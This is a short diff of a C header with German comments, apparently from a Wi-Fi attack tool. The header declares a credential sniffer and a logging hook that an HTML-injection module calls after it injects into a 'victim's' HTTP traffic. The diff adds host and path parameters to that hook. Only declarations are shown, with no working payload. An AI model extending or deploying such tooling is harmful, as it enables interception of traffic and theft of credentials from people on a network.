@@ -42,12 +42,15 @@ void wlan_cred_sniff_free(WlanCredSniff* cs);
 void wlan_cred_sniff_feed_eth(WlanCredSniff* cs, const uint8_t* eth, uint16_t len);
 
 /** Einen "INJ"-Eintrag in den Ring legen — wird vom wlan_html_inject-Modul
- *  bei erfolgreichem Inject gerufen. host/path werden über eine kleine
- *  Per-Flow-Map nachgeschlagen, die beim parse_http für jeden Request
- *  beschrieben wird. Wenn kein Lookup-Treffer: Server-IP als Host-Fallback.
+ *  bei erfolgreichem Inject gerufen. host und path müssen vom Caller geliefert
+ *  werden (er hat per-Flow gecacht, was zur aktuellen Response gehört — hier
+ *  nochmal aus url_track lesen wäre fragil bei HTTP/1.1 keep-alive, weil
+ *  inzwischen ein neuer Request den Slot überschrieben haben kann). NULL/""
+ *  → Server-IP als Host-Fallback.
  *  Aus dem lwIP-tcpip_thread aufzurufen (single producer). */
 void wlan_cred_sniff_push_inject(
-    WlanCredSniff* cs, uint32_t server_ip, uint32_t victim_ip, uint16_t victim_port);
+    WlanCredSniff* cs, uint32_t server_ip, uint32_t victim_ip, uint16_t victim_port,
+    const char* host, const char* path);
 
 /** Lookup im Per-Flow-Tracking. host_out/path_out werden mit dem letzten
  *  bekannten Host bzw. Pfad für (server_ip, victim_port) gefüllt. Liefert
